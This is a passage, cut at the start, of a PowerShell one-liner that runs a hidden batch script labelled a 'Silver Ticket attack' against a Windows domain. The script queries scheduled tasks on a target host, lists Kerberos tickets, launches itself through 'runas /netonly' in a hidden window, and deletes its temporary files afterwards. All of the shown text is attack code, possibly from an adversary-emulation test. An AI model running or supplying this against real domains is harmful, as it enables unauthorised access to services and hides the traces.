schtasks /query /S {target}.{domain}
echo.
echo Tickets after requesting schtasks:
klist
echo.
echo End of Silver Ticket attack
)
"@; $batchContent | Out-File -Encoding OEM $env:TEMP\silver.bat; Start-Process -FilePath 'runas.exe' -ArgumentList "/netonly /user:fake `"$env:TEMP\silver.bat`"" -WindowStyle Hidden | Out-Null; do { Start-Sleep 1; $content = Get-Content -Path $env:TEMP\silver.txt -Wait; if ($content -match 'End of Silver Ticket attack') { break } } while ($true); Get-Content $env:TEMP\silver.txt; Remove-Item $env:TEMP\silver.bat -ErrorAction SilentlyContinue; Remove-Item $env:TEMP\silver.txt -ErrorAction SilentlyContinue

